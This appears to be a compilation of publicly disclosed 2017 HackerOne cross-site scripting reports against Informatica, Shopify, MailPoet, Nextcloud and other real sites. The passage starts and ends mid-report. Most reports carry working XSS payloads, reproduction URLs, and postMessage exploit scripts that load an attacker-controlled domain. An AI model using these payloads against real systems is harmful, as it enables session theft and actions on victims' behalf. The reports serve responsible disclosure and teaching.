This happens because the `$uploader_l10n` is passed to `handlers.min.js` (non minified version shown)
 and interpolated without escaping the value previously.

First the value passes trough a error case 
```
// $uploader_l10n
case plupload.FILE_SIZE_ERROR:
			uploadSizeError(uploader, fileObj); // fileObj contains the filename payload in name attribute.
			break;
....
if ( max > hundredmb && fileObj.size > hundredmb )
				wpFileError( fileObj, pluploadL10n.big_upload_failed.replace('%1$s', '<a class="uploader-html" href="#">').replace('%2$s', '</a>') );
```

and lastely interpolated and appended to the dom.

```

function uploadSizeError( up, file, over100mb ) {
	var message;

	if ( over100mb )
		message = pluploadL10n.big_upload_queued.replace('%s', file.name) + ' ' + pluploadL10n.big_upload_failed.replace('%1$s', '<a class="uploader-html" href="#">').replace('%2$s', '</a>');
	else
		message = pluploadL10n.file_exceeds_size_limit.replace('%s', file.name);


	jQuery('#media-items').append('<div id="media-item-' + file.id + '" class="media-item error"><p>' + message + '</p></div>');
	up.removeFile(file);
}
```

The critical lines are 
```
message = pluploadL10n.big_upload_queued.replace('%s', file.name) + ' ' + pluploadL10n.big_upload_failed.replace('%1$s', '<a class="uploader-html" href="#">').replace('%2$s', '</a>');
	else
		message = pluploadL10n.file_exceeds_size_limit.replace('%s', file.name);
```

# Suggested fix:
Remove the filename or escape safely in context.

---

### [Cross-site Scripting (XSS) in /updates-pro/archive/](https://hackerone.com/reports/235866)

- **Report ID:** `235866`
- **Severity:** Critical
- **Weakness:** Cross-site Scripting (XSS) - Generic
- **Program:** MapsMarker.com e.U.
- **Reporter:** @paulochoupina
- **Bounty:** - usd
- **Disclosed:** 2017-07-02T23:03:38.633Z
- **CVE(s):** -

**Vulnerability Information:**

Hey guys.
The dir parameter on /updates-pro/archive/ seems to be vulnerable to Cross-site Scripting.

Steps to reproduce:
1- Navigate to: https://www.mapsmarker.com/updates-pro/archive/?dir=v3.0.1
2- Add this to the url: <svG onLoad=prompt(9)>
3- Result in attached printsceen.

Or quite simple visit:
https://www.mapsmarker.com/updates-pro/archive/?dir=v3.0.1%3CsvG%20onLoad=prompt(1)%3E

---

### [[kb.informatica.com] DOM based XSS in the bindBreadCrumb function](https://hackerone.com/reports/189834)

- **Report ID:** `189834`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Generic
- **Program:** Informatica
- **Reporter:** @s_p_q_r
- **Bounty:** - usd
- **Disclosed:** 2017-06-24T13:54:59.729Z
- **CVE(s):** -

**Vulnerability Information:**

The ***bindBreadCrumb*** function, which is called after the document is loaded:

```javascript
$(document).ready(function () {
    bindBreadCrumb();
});
```

has the following insecure link assignments, that use non-encoded URL values:

```javascript
strChild = "<a href='" + document.URL + "' style='color:#fff !important;font-size:10px'>Search Results</a>";

strChild = "<a href='" + varCoveoSearchResultPageURL + "' style='color:#999 !important;' >Search Results</a>";

strChild = "<a href='" + varDocumentReferrer + "' style='color:#999 !important;' >Search Results</a>";

strChild = "<a href='" + varStaticCoveoSearchResultPageURL + "' style='color:#999 !important;' >Search Results</a>";
```
etc.

This gives an attacker the opportunity to inject code with Javascript there.

 
As a proof of concept let's consider the case of the referrer value injection at the https://kb.informatica.com/solution/4/Pages/7377.aspx page:

```javascript
if (qString('myk') != '') {

	var previousUrl = document.referrer.toLowerCase();

	var varCoveoSearchResultPageName = fnGetSearchPageName();

	if (previousUrl.indexOf("/home.aspx") > -1) {
	
		<...>
		
	} else {
	
	if (varCoveoSearchResultPageName != "") {
	
		<...>
		
	} else {
		
		var varDocumentReferrer = document.referrer;

		if (varDocumentReferrer != "") {
		
			if (varDocumentReferrer.toLowerCase().indexOf(fnGetKBSFDCHostName()) != -1) {
			
				var li = document.createElement("li");
				strChild = "<a href='" + varDocumentReferrer + "' style='color:#999 !important;' >Search Results</a>";
				li.innerHTML = strChild;
				document.getElementById('DynamicBreadcrumb').appendChild(li);
				
			} else {
				
				<...>
				
			}
			
		}
		else {
			
			<...>
			
		}

	}
	
	<...>

	}
}
```

As we can see, for the attack to succeed, the query string parameter **myk** must be non-empty:

```javascript
if (qString('myk') != '') {
```

the **referrer** value most not contain **/home.aspx**:

```javascript
var previousUrl = document.referrer.toLowerCase();

if (previousUrl.indexOf("/home.aspx") > -1) {

	<...>
	
} else {
```

the **CoveoSearchUrl** cookie value must be mepty:

```javascript
function fnGetSearchPageName() {
	
	var searchPageName = GetKBCookieValue("CoveoSearchUrl");
	
	if (searchPageName != "") {
		searchPageName = searchPageName.split("/").slice(-1)[0].split("?")[0];
	}
	
	return searchPageName;
}

<...>

var varCoveoSearchResultPageName = fnGetSearchPageName();

if (varCoveoSearchResultPageName != "") {

	<...>
	
} else {
```

and the **referrer** value must contain **//search.informatica.com**:

```javascript
function fnGetKBSFDCHostName() {
	
	<...>
	
	if (document.location.href.indexOf("kb.informatica.com") > -1) {
		return "//search.informatica.com"; 
	}
	
	<...>
	
}

<...>

var varDocumentReferrer = document.referrer;

if (varDocumentReferrer != "") {
		
	if (varDocumentReferrer.toLowerCase().indexOf(fnGetKBSFDCHostName()) != -1) {
```

**PoC:**

1. Open the http://spqr.zz.mu/loc.php?//search.informatica.com&'/onmouseover='alert(document.domain)'&url=https://kb.informatica.com/solution/4/Pages/17377.aspx?myk=xxx link in IE
2. Wait for the page to load and put the mouse cursor over the "Search results" link on top

The script will be executed:

{F142063}

Tested with Internet Explorer 11.447 and Microsoft Edge 38.14393.

Same for the other link assignment cases.

---

### [MailPoet Newsletters <= 2.7.2 - Authenticated Reflected Cross-Site Scripting (XSS)](https://hackerone.com/reports/200355)

- **Report ID:** `200355`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Generic
- **Program:** Eternal
- **Reporter:** @madrobot
- **Bounty:** - usd
- **Disclosed:** 2017-06-17T17:58:38.886Z
- **CVE(s):** -

**Vulnerability Information:**

Hello __Team__

__Abstract__:-
A Cross-Site Scripting vulnerability was found in the MailPoet Newsletters plugin. This issue allows an attacker to perform a wide variety of actions, such as stealing Administrators' session tokens, or performing arbitrary actions on their behalf. In order to exploit this issue, the attacker has to lure/force a logged on WordPress Administrator into opening a URL provided by an attacker.

__Introduction__:-
The MailPoet Newsletters plugin allows a WordPress administrator to create newsletters, automated emails, post notifications and autoresponders. A Cross-Site Scripting vulnerability was found in the MailPoet Newsletters plugin. This issue allows an attacker to perform a wide variety of actions, such as stealing Administrators' session tokens, or performing arbitrary actions on their behalf. In order to exploit this issue, the attacker has to lure/force a logged on WordPress Administrator into opening a URL provided by an attacker.

__Proof of concept__:-
Have an authenticated admin visit the URL:-

https://business-blog.zomato.com//?wysija-page=1&controller=subscribers&action=wysija_outter&encodedForm=eyJmb3JtIjoiUHduIiwiYWZ0ZXJfd2lkZ2V0IjoiPHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4ifQ==
The encodedForm parameter is the base64 encoded string:
{"form":"Pwn","after_widget":"<script>alert('XSS)</script>"}

A pop-up box should appear, meaning the JavaScript contained in the request_id request parameter was executed by the browser.

{F154227}

__Fix__:-
This issue is resolved in MailPoet Newsletters version 2.7.3.

__Regards__,
Santhosh

---

### [XSS in $shop$.myshopify.com/admin/ via twine template injection in "Shopify.API.Modal.input" method when using a malicious app](https://hackerone.com/reports/217790)

- **Report ID:** `217790`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Generic
- **Program:** Shopify
- **Reporter:** @bored-engineer
- **Bounty:** 1000 usd
- **Disclosed:** 2017-06-01T16:42:17.056Z
- **CVE(s):** -

**Vulnerability Information:**

#Description
The Shopify [Embedded App SDK](https://help.shopify.com/api/sdks/merchant-apps/embedded-app-sdk) is used to facilitate limited interactions with parent page (`/admin/apps/$id`) from an embedded app within the shop admin interface. The SDK has multiple methods which allow an app to interact with the user which execute in the context of the admin domain and pass information back to the app. These UI elements are rendered from predefined templates using [lodash](https://lodash.com)'s [_.template](https://lodash.com/docs/4.17.4#template) method. While the method automatically provides input escaping the "input" template (used by the `Shopify.API.Modal.input` method) assigns a value to a special `data-define` attribute. While it's not possible to escape the attribute context, because the escaping is not fully context-aware it is possible to inject additional data into the attribute which is later interpreted by [twine](http://shopify.github.io/twine/). Because twine does not execute in a sandbox this template becomes an eval primitive and it possible to obtain XSS in the context of the parent application. 

#Technical Details
When the `Shopify.API.Modal.input` method the following "input" template is rendered using [lodash](https://lodash.com)'s [_.template](https://lodash.com/docs/4.17.4#template) method: 
```html
...
<div class="ui-modal__body" data-define="{typedInput: &#39;[%= value %]&#39;}">
...
<label class="next-label" for="text-a10e7047a92878fc20031f40da0b5231"></label>
<input type="text" id="text-a10e7047a92878fc20031f40da0b5231" data-bind="typedInput" autofocus="autofocus" class="next-input" />
...
<button class="btn close-modal [%= buttonClass %]" data-bind-event-click="closeModal({result: true, data: typedInput})" type="button" name="button">[%= okButton %]</button>
...
```
The `typedInput` parameter is initialized from the `value` template parameter, bound to the text input, and finally used when the "okButton" is clicked. The data binding is handled by Shopify's [twine](http://shopify.github.io/twine/) JS library. Unfortunately because  [_.template](https://lodash.com/docs/4.17.4#template) is not fully context aware it will not provide JSON escaping for this parameter. For example if `value` is set to `some'value` the following invalid JSON will be created in the `data-define` attribute:
```
{typedInput: 'some'value'}
```
Normally this would just break the intended functionality, however if we analyze [twine](http://shopify.github.io/twine/) we can discover that this type of injection can actually result in arbitrary JS execution. Twine evaluates parameters using the (wrapFunctionString)[https://github.com/Shopify/twine/blob/24c4ccfccf5b50937e6d9e433676651549be1497/dist/twine.js#L373] method:
```js
wrapFunctionString = function(code, args, node) {
  var e, error, keypath;
  if (isKeypath(code) && (keypath = keypathForKey(node, code))) {
    if (keypath[0] === '$root') {
      return function($context, $root) {
        return getValue($root, keypath);
      };
    } else {
      return function($context, $root) {
        return getValue($context, keypath);
      };
    }
  } else {
    code = "return " + code;
    if (nodeArrayIndexes(node)) {
      code = "with($arrayPointers) { " + code + " }";
    }
    if (requiresRegistry(args)) {
      code = "with($registry) { " + code + " }";
    }
    try {
      return new Function(args, "with($context) { " + code + " }");
    } catch (error) {
      e = error;
      throw "Twine error: Unable to create function on " + node.nodeName + " node with attributes " + (stringifyNodeAttributes(node));
    }
  }
};
``` 
The method wraps the attribute value in a [with](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/with) block to provide named variables and passes it to a [Function](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function) constructor which acts as a eval primitive. This means any injection will result in JavaScript execution. For example, if the following data is used for the `value` template parameter it will flow as follows:
```
'-alert(document.domain)-'
``` 
This will result in a `data-define` attribute with the following value:
```js
{typedInput:''-document.domain-''}
```
This will result in the following code executing within twine:
```js
with($context) {
  with($registry) {
    return {typedInput: ''-alert(document.domain)-''}
  }
}
```
Putting this all together with the SDK we get the following script:
```js
window.parent.postMessage(JSON.stringify({
  message: "Shopify.API.Modal.input",
  data: {
    message: {
      message: "", 
      value: "'-alert(document.domain)-'",
    }
  }
}), "*");
```
#Exploitability
You need to convince an administrator to authorize your malicious application, however the exploit does not require any specific permissions to trigger so an admin may be more willing to authorize the application. 

#Proof of Concept
I've created an example malicious application associated with my partner account `shopify-whitehat-1@bored.engineer` to demonstrate the issue...
Open the following URL on on `$your-shop$.myshopify.com`:
```
/admin/oauth/authorize?client_id=5b7bd427b8caa69610bf85d1c87d4a04&scope=read_products&redirect_uri=https://attackerdoma.in/a4d76231-8657-48ed-8800-f1b02c7bb2ff.html&state=nonce
```
After authorizing the application an alert should appear on the `/admin` window containing `document.domain`.

#Remediation
The "input" template should be updated to make the `value` parameter context-aware, perhaps wrapping in a `JSON.stringify` call.

**Summary (team):**

This report demonstrated an XSS that could be exploited by a malicious application installed on a store to execute javascript as a store administrator. The cause of the XSS turned out to be improperly escaped user input in a lodash template.

---

### [XSS in $shop$.myshopify.com/admin/ via "Button Objects" in malicious app](https://hackerone.com/reports/217745)

- **Report ID:** `217745`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Generic
- **Program:** Shopify
- **Reporter:** @bored-engineer
- **Bounty:** 800 usd
- **Disclosed:** 2017-05-22T20:27:48.405Z
- **CVE(s):** -

**Vulnerability Information:**

This report is similar in impact, exploitability and root-cause as report #205701 requiring an additional step of user-interaction. 

#Description
The Shopify [Embedded App SDK](https://help.shopify.com/api/sdks/merchant-apps/embedded-app-sdk) is used to facilitate limited interactions with parent page (`/admin/apps/$id`) from an embedded app within the shop admin interface. The SDK has multiple methods which accept a `buttons` parameter which is defined under the [button objects](https://help.shopify.com/api/sdks/shopify-apps/embedded-app-sdk/methods#button-objects) section of the SDK documentation. Buttons can define a `href` parameter which will open when the button is clicked. The `href` parameter is not properly sanitized allowing a malicious app to execute JavaScript in the context of the admin interface.

#Technical Details
When a button is clicked the `clickButton` method is called, the method is defined as follows:
```js
clickButton = function(_, data) {
  if ((data.loading || "undefined" == typeof data.loading && "app" === data.target) && Shopify.Loading.start(), href = data.href) {
    switch (data.target) {
      case "parent":
      case "shopify":
        Page.visit(href, {
          reload: true
        });
        break;
        case "app":
          break;
        default:
          Page.open(href)
    }
  }
}
```
If no `target` parameter is specified (and the application is already loaded) `Page.open` will be called. This method is defined like this:
```
Page.open = function() {
  return window.open.apply(window, arguments);
}
```
You would expect `window.open` is safe to call with untrusted URLs as it will open in a new window/tab however this is not the case. When `window.open` is called with a `javascript:` URL a new window/tab will be opened with the domainless `about:blank` location (or similar depending on the browser) however the `document.domain` property will be shared with the opener window. Because the documents share `document.domain` the new window will be able to access the opener window and trigger JavaScript execution. You can test this yourself like this:
```js
window.open("javascript:window.opener.alert('bored-engineer')")
```
In the context of Shopify this means an application can create a button that will trigger XSS on the admin interface when the button is clicked. The following script was used to demonstrate the issue:
```js
window.parent.postMessage(JSON.stringify({
  message: "Shopify.API.Bar.initialize",
  data: {
    buttons: {
      primary: {
        label: "Click here for XSS",
        href: "javascript:setTimeout('window.close()',1);window.opener.eval('alert(document.domain)');",
      }
    }
  }
}), "*");
```
I wanted to note that this needs to be fixed in the `Shopify.EmbeddedAppButtons` class since this issue affects all methods which render buttons. For example the following script will also trigger XSS using a different method:
```js
window.parent.postMessage(JSON.stringify({
  message: "Shopify.API.Modal.open",
  data: {
    src: "https://attackerdoma.in",
    buttons: {
      primary: {
        label: "Click here for XSS",
        href: "javascript:setTimeout('window.close()',1);window.opener.eval('alert(document.domain)');",
      }
    }
  }
}), "*");
```

#Exploitability
You need to convince an administrator to authorize your malicious application, however the exploit does not require any specific permissions to trigger so an admin may be more willing to authorize the application. Once the administrator has loaded the application it is likely they will click at least one of the multiple entry-points for buttons. 

#Proof of Concept
I've created an example malicious application associated with my partner account `shopify-whitehat-1@bored.engineer` to demonstrate the issue...
Open the following URL on on `$your-shop$.myshopify.com`:
```
/admin/oauth/authorize?client_id=18cc7056a1476994411e3d21971289a7&scope=read_products&redirect_uri=https://attackerdoma.in/1b61d988-374e-48c8-ae6a-6eb28a0f25de.html&state=nonce
```
After authorizing the application and click the "Click here for XSS" button in the upper-right corner. An alert should appear on the `/admin` window containing `document.domain`.

#Remediation
The application should sanitize the `href` parameter for all "button objects" either before creating the elements in the DOM, or in the `clickButton` method before calling `Page.open`.

---

### [[marketplace.informatica.com] Search XSS](https://hackerone.com/reports/200034)

- **Report ID:** `200034`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Generic
- **Program:** Informatica
- **Reporter:** @s_p_q_r
- **Bounty:** - usd
- **Disclosed:** 2017-05-22T04:08:23.983Z
- **CVE(s):** -

**Vulnerability Information:**

The search query parameter is put into Javascript to set the localStorage item:

https://marketplace.informatica.com/search-solr.jspa?q=%foo%

```javascript
localStorage.setItem("searchTerm", "%foo%");
```

Attempts to inject XSS payloads are blocked by redirection that removes special chars from the URL:

```http
GET /search-solr.jspa?q=aaa%22bbb%27ccc%3Cddd%3Eeee HTTP/1.1
Host: marketplace.informatica.com

HTTP/1.0 302 Found
Location: https://marketplace.informatica.com/search-solr.jspa?q=aaabbbcccdddeee
```

However it turns out the search param can be successfully submitted via POST — the following request popups an alert:

```http
POST /search-solr.jspa HTTP/1.1
Host: marketplace.informatica.com

q=%22-alert%28document.domain%29-%22
```

**PoC:**

http://spqr.zz.mu/info_mp.php?key=066c1cac-b380-4455-9d36-4086dd999dd9

Tested with latest Firefox and Chrome.

---

### [[network.informatica.com] The login form XSS via the referer value](https://hackerone.com/reports/190016)

- **Report ID:** `190016`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Generic
- **Program:** Informatica
- **Reporter:** @s_p_q_r
- **Bounty:** - usd
- **Disclosed:** 2017-05-22T04:08:13.461Z
- **CVE(s):** -

**Vulnerability Information:**

The **referer** parameter value https://network.informatica.com/login!input.jspa?referer=%ref% is inserted into the Javascript code

```javascript
if (pageURL.indexOf("login!input.jspa?referer=") > -1 || pageURL.indexOf("login.jspa?referer=") > -1) {
	finalPageURL='%ref%';
}
```
and used in further redirection without validation:

```javascript
InfaAutoLogin.authenticateUser(response.id, finalPageURL, {
	callback:function(responseMap) {
		if(responseMap['status'] === 'success') {
			document.location = responseMap['location'];
		}
		else {
			sessionStorage.setItem('autoLoginType', responseMap['statusMsg']);
		}
	}
});
```

This means an attacker can put JS links there, which will cause script execution in the victim's browser:

1. Log into your Informatica Network account
2. Go to https://network.informatica.com/login!input.jspa?referer=javascript:alert(document.domain)

{F142238}

Tested with latest Firefox and Chrome.

---

### [[careers.informatica.com] Cross Site Script Vulnerability on informatica](https://hackerone.com/reports/42537)

- **Report ID:** `42537`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Generic
- **Program:** Informatica
- **Reporter:** @gorkha
- **Bounty:** - usd
- **Disclosed:** 2017-05-10T03:42:33.088Z
- **CVE(s):** -

**Vulnerability Information:**

Information:- Vulnerability resides on the Carriers page of informatica, where search bar of the carrier page failed to sanitized the users query and hence gives the XSS popup. 

Vulnerable URL:- https://careers.informatica.com/

Payload:- "><svg/onload=prompt(1);>

Steps to Reproduce the Vulnerability
1. Open Carriers page of Informatica and search for anything. 
2. On the next page (search Result page) of search result, there is a option of All Location. 
3. Now search on the All Location field with you JavaScript Payload. (For E.g :- "><svg/onload=prompt(1);>)
4. As it search, you will get the XSS popup on your Screen which shows that page is vulnerable to XSS vulnerability.

Hope you got the issue and fixed it soon.

---

### [Stored XSS in community.ubnt.com](https://hackerone.com/reports/179164)

- **Report ID:** `179164`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Generic
- **Program:** Ubiquiti Inc.
- **Reporter:** @vibs123i
- **Bounty:** - usd
- **Disclosed:** 2017-04-28T09:55:44.934Z
- **CVE(s):** -

**Vulnerability Information:**

I have created two accounts
one attacker account: vibhuti123_i
other victim account: John_victim

 attacker account:vibhuti123_i who will create a malicious link after uploading svg file embeded with script and doing stored xss.Now attacker vibhuti123_i will send this  stored xss malicious link to victim:john_victim by posts,message,reply of ubnt community features or anyother way of communication.After this John_victim will believe this link as it is saved on community.ubnt.com server.It's no way look dangerous so john_victim will click this link and xss gets executed.

This stored xss link created by attacker will execute in every account and also it is accessible without login.
http://community.ubnt.com/t5/image/serverpage/image-id/0iA7662344C5BC7B7E/image-size/thumb/is-preview/true?v=v2&px=100

Please go through Video POC:--
https://youtu.be/Z0UCmv-Tpqs 


PLease read the Document of OWASP.org about svg xss below:

https://www.owasp.org/images/0/03/Mario_Heiderich_OWASP_Sweden_The_image_that_called_me.pdf

---

### [Bypass to postMessage origin validation via FTP](https://hackerone.com/reports/210654)

- **Report ID:** `210654`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Generic
- **Program:** Slack
- **Reporter:** @a1kmm-
- **Bounty:** - usd
- **Disclosed:** 2017-04-21T20:53:25.353Z
- **CVE(s):** -

**Summary (team):**

@a1kmm- discovered a bypass to our postMessage origin check, wherein an attacker with existing MITM capabilities could use FTP to bypass validation and view XOXS tokens of victims on the local network. This was related to, and investigated at the same time as, a previous report. This issue is now resolved and was not exploited. Thanks @a1kmm-!

---

### [[marketplace.informatica.com]- Stored XSS on Image title and Edit Property](https://hackerone.com/reports/202951)

- **Report ID:** `202951`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Generic
- **Program:** Informatica
- **Reporter:** @fillawful
- **Bounty:** - usd
- **Disclosed:** 2017-04-21T12:06:39.594Z
- **CVE(s):** -

**Vulnerability Information:**

By uploading and image with the title of ``` "><svg onload=alert(1)>.jpg``` and allowing anyone to edit the Document under collaboration settings, XSS can be triggered by any user attempting to edit the document.

 POC
====
1.  Log into marketplace and go to profile page.  Select New > Document
2.  Choose to upload document and browse to your image with the javascript payload as the name.
3.  Enter anything as Description and and tags field
4.  Select visibility open to anyone
5. Expand collaboration options and allow anyone to edit document. (This drastically increases security issue.)
6. Choose to publish
7. After publishing choose to Edit Document from the right hand menu and observe XSS.

Please see accompanying screenshots as POC

### Please let me know if you need any more information. Cheers!

---

### [[marketplace.informatica.com] Profile stored XSS](https://hackerone.com/reports/190217)

- **Report ID:** `190217`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Generic
- **Program:** Informatica
- **Reporter:** @s_p_q_r
- **Bounty:** - usd
- **Disclosed:** 2017-04-19T17:39:07.985Z
- **CVE(s):** -

**Vulnerability Information:**

The user name and lastname are inserted into JS with quotes non-escaped:

```javascript
var pageNameDTM = "%name% %lastname%".replace(/[^a-zA-Z0-9 ]/g, "").replace(/  +/g, " ");
```

**PoC:**

1. Log into your account
2. Set your name and lastname to **"-alert(document.domain)-"**
3. Open your profile page https://marketplace.informatica.com/people/%email% from another account

The script will be executed:

{F142515}

---

### [[kb.informatica.com] Stored XSS](https://hackerone.com/reports/170369)

- **Report ID:** `170369`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Generic
- **Program:** Informatica
- **Reporter:** @albinowax
- **Bounty:** - usd
- **Disclosed:** 2017-04-09T12:22:44.923Z
- **CVE(s):** -

**Vulnerability Information:**

kb.informatica.org is vulnerable to stored XSS as it stores user input in users' sessions, then reflects this input back inside a JavaScript block without adequate escaping.

To replicate this issue, first store the payload in your session by visiting: https://kb.informatica.com/kbexternal/Pages/KBSearchResults.aspx?k=Support%20Console&fromsource=11171"%3balert(1)%2f%2f535

Then visit https://kb.informatica.com/faq/1/Pages/17033.aspx?docid=17033&type=external&isSearch=external

This should trigger an alert, due to the following HTML in the second response: 
<script type="text/javascript">
//<![CDATA[
var isExternal = true; var varSearchResultURL = "http://kb.informatica.com:7001/kbexternal/Pages/KBSearchResults.aspx?k=Support Console&fromsource=11171";alert(1)//535";

Replicating this may take a few attempts - it's a bit flaky. I used Firefox but it ought to work in any browser. Let me know if you have trouble.

---

### [Stored XSS via Discussion Title and Send as Email attribute in [marketplace.informatica.com]](https://hackerone.com/reports/203912)

- **Report ID:** `203912`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Generic
- **Program:** Informatica
- **Reporter:** @fillawful
- **Bounty:** - usd
- **Disclosed:** 2017-04-08T12:39:29.782Z
- **CVE(s):** -

**Vulnerability Information:**

POC
===
1.  Under "Your Stuff" choose to "Create a Discussion/Ask a question"
2. Choose a space to submit your discussion/question. Any space will do.
3. Title your discussion with the payload `"><img src=x onerror=alert(1)>`
4. Choose "Post message" to publish.
5. View the message as any user. Under "Actions" choose to "Send as Email"
6. Observe XSS poc alert box"

Please let me know if you have any questions.

---

### [[careers.informatica.com] XSS on "isJTN"](https://hackerone.com/reports/190020)

- **Report ID:** `190020`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Generic
- **Program:** Informatica
- **Reporter:** @huntertxt
- **Bounty:** - usd
- **Disclosed:** 2017-04-07T16:29:46.216Z
- **CVE(s):** -

**Vulnerability Information:**

hi ,
i found XSS bug on parameter  "isJTN=" at careers.informatica.com give you ability to run java script code
tested on firefox 50.0.2 also on old version of google chrome in the last version , but if try this bug in chrome last version you will got a source code displayed on page with out run cuz security protected stop XSS code 

* POC

used payload   : </ScrIpt><SCRIPT>+alert("X");</SCRIPT>

https://careers.informatica.com/apply?applySource=Quick%20Apply&isJTN=</ScrIpt><SCRIPT>+alert("X");</SCRIPT>true&isQuickApply=false

are this eligible for swag !?
cheer

---

### [upgrade Aspen on inside.gratipay.com to pick up CR injection fix](https://hackerone.com/reports/143139)

- **Report ID:** `143139`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Generic
- **Program:** Gratipay
- **Reporter:** @valievkarim
- **Bounty:** 40 usd
- **Disclosed:** 2017-03-22T22:31:09.767Z
- **CVE(s):** -

**Vulnerability Information:**

1) Using IE11, open DevTools and start network capture
2) visit the following URL:
http://inside.gratipay.com/assets/%0dSet-Cookie:%20qwe=qwe%0dq

3) find a 'qwe' cookie set in the response

There is a 0x0d character injected, which can be used as a header
delimiter in IE.
To see this behaviour using Curl, you can use the following command:
curl -s -v 'http://inside.gratipay.com/assets/%0dSet-Cookie:%20qwe=qwe%0dq' 2>&1|less

Screenshots of Curl output and DevTools are attached.

---

### [Reflected XSS in U2F plugin by shipping the example endpoints](https://hackerone.com/reports/192786)

- **Report ID:** `192786`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Generic
- **Program:** Nextcloud
- **Reporter:** @lukasreschke
- **Bounty:** - usd
- **Disclosed:** 2017-03-22T11:42:48.183Z
- **CVE(s):** -

**Vulnerability Information:**

While running a [RIPS scan](https://www.ripstech.com/) against our [instrumentalized source code](https://github.com/nextcloud/php-static-scanner-instrumentalization) it noticed that the file `/apps/twofactor_u2f/vendor/yubico/u2flib-server/examples/localstorage/index.php` echoes on user input:

{F145451}

I was first a tad confused because [the examples have been removed from our Git repository](https://github.com/nextcloud/twofactor_u2f/tree/3321e0dc84208adb623b6843f72e81782d9f2b6e/vendor/yubico/u2flib-server), but the release from apps.nextcloud.com ships with that file. So I suppose the Makefile is downloading the dependencies again.

While exploiting this is not entirely trivial due to some sanity checks in the code above it is however possible, the following CSRF PoC will trigger a popup:

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="http://10.211.55.7/stable9/apps/twofactor_u2f/vendor/yubico/u2flib-server/examples/localstorage/index.php" method="POST">
      <input type="hidden" name="doAuthenticate" value="&#123;&quot;signatureData&quot;&#58;&quot;AQAAABowRAIgMZL56nkLO7gs2OYoUW8RE3xAWLAvzroTiWO2T2PBb&#45;wCID6zjKjjxsqqG5NZ4upnT1xCeFmnDSefS&#95;TWHZWjoXgx&quot;&#44;&quot;clientData&quot;&#58;&quot;eyAiY2hhbGxlbmdlIjogIjFQX1l4TWpGVEhPcmNyQmlwUF8tLXRtVjA4SXNRUnVXaVlwZVZYVlNpVFUiLCAib3JpZ2luIjogImh0dHA6XC9cLzEwLjIxMS41NS43IiwgInR5cCI6ICJuYXZpZ2F0b3IuaWQuZ2V0QXNzZXJ0aW9uIiB9&quot;&#44;&quot;keyHandle&quot;&#58;&quot;9cgajEA4PWsnEbpgfnaxFBxMsiUNWo4GKbdk5PrdMn3c139bG3mXqLVw3VwpdcQzzPmVyGF6KBvFZsb2jpzdmg&quot;&#125;" />
      <input type="hidden" name="request" value="&#91;&#123;&quot;version&quot;&#58;&quot;U2F&#95;V2&quot;&#44;&quot;challenge&quot;&#58;&quot;1P&#95;YxMjFTHOrcrBipP&#95;&#45;&#45;tmV08IsQRuWiYpeVXVSiTU&quot;&#44;&quot;keyHandle&quot;&#58;&quot;9cgajEA4PWsnEbpgfnaxFBxMsiUNWo4GKbdk5PrdMn3c139bG3mXqLVw3VwpdcQzzPmVyGF6KBvFZsb2jpzdmg&quot;&#44;&quot;appId&quot;&#58;&quot;http&#58;&#47;&#47;10&#46;211&#46;55&#46;7&quot;&#125;&#93;" />
      <input type="hidden" name="registrations" value="&#91;&#123;&quot;keyHandle&quot;&#58;&quot;9cgajEA4PWsnEbpgfnaxFBxMsiUNWo4GKbdk5PrdMn3c139bG3mXqLVw3VwpdcQzzPmVyGF6KBvFZsb2jpzdmg&quot;&#44;&quot;publicKey&quot;&#58;&quot;BPtO8T0VluUL14FRKvEkZ5lP&#47;3W4F7er4WS87iYfrpoKj0Fjo&#43;M&#43;zAxNsuhYd&#43;3rYQFVPr4hflhOh3lMSZ605Fg&#61;&quot;&#44;&quot;certificate&quot;&#58;&quot;MIICLjCCARigAwIBAgIECmML&#92;&#47;zALBgkqhkiG9w0BAQswLjEsMCoGA1UEAxMjWXViaWNvIFUyRiBSb290IENBIFNlcmlhbCA0NTcyMDA2MzEwIBcNMTQwODAxMDAwMDAwWhgPMjA1MDA5MDQwMDAwMDBaMCkxJzAlBgNVBAMMHll1YmljbyBVMkYgRUUgU2VyaWFsIDE3NDI2MzI5NTBZMBMGByqGSM49AgEGCCqGSM49AwEHA0IABKQjZF26iyPtbNnl5IuTKs&#92;&#47;fRWTHVzHxz1IHRRBrSbqWD60PCqUJPe4zkIRFqBa4NnzdhVcS80nlZuY3ANQm0J&#43;jJjAkMCIGCSsGAQQBgsQKAgQVMS4zLjYuMS40LjEuNDE0ODIuMS4yMAsGCSqGSIb3DQEBCwOCAQEAZTmwMqHPxEjSB64Umwq2tGDKplAcEzrwmg6kgS8KPkJKXKSu9T1H6XBM9&#43;LAE9cN48oUirFFmDIlTbZRXU2Vm2qO9OdrSVFY&#43;qdbF9oti8CKAmPHuJZSW6ii7qNE59dHKUaP4lDYpnhRDqttWSUalh2LPDJQUpO9bsJPkgNZAhBUQMYZXL&#92;&#47;MQZLRYkX&#43;ld7llTNOX5u7n&#92;&#47;4Y5EMr&#43;lqOyVVC9lQ6JP6xoa9q6Zp9&#43;Y9ZmLCecrrcuH6&#43;pLDgAzPcc8qxhC2OR1B0ZSpI9RBgcT0KqnVE0tq1KEDeokPqF3MgmDRkJ&#43;&#43;&#92;&#47;a2pV0wAYfPC3tC57BtBdH&#92;&#47;UXEB8xZVFht